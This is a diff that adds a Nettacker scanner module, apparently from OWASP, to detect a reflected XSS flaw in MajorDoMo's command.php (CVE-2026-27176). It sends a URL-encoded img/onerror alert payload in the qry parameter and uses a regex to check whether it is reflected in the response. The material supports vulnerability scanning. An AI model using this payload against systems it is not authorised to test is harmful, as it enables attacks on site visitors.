@@ -1,0 +1,57 @@
+info:
+  name: majordomo_xss_cve_2026_27176_vuln
+  author: OWASP Nettacker Team
+  severity: 6.1
+  description: Reflected Cross-Site Scripting (XSS) vulnerability in MajorDoMo command.php via the qry parameter. An attacker can inject arbitrary JavaScript that is reflected in the response and executed in the victim's browser.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-27176
+  profiles:
+    - vuln
+    - http
+    - medium_severity
+    - cve2026
+    - cve
+    - majordomo
+    - xss
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              paths:
+                - command.php?qry=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
+
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+
+            headers:
+              Content-Type:
+                regex: text/html
+                reverse: false
+
+            content:
+              regex: |
+                (?s)(?=.*Command:)(?=.*\">\x3Cimg src=x onerror=alert\(document\.domain\)\x3E)
+              reverse: false
